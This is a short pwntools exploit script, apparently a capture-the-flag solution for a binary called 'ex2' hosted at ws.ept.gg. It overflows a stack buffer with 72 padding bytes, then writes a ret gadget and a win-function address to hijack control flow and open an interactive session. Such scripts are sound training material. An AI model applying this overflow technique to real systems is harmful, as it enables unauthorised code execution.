#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ex2')

host = args.HOST or 'ws.ept.gg'
port = int(args.PORT or 8885)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+53
continue
'''.format(**locals())
#win function @  0x4011fb
win_func = b'\xfb\x11\x40\x00\x00\x00\x00\x00'
# ret addr = 0x401211
ret_addr = b'\x11\x12\x40\x00\x00\x00\x00\x00'

# -- Exploit goes here --

io = start()
info = io.recvline()
io.sendline(b'A'*72 + ret_addr + win_func)
io.interactive()

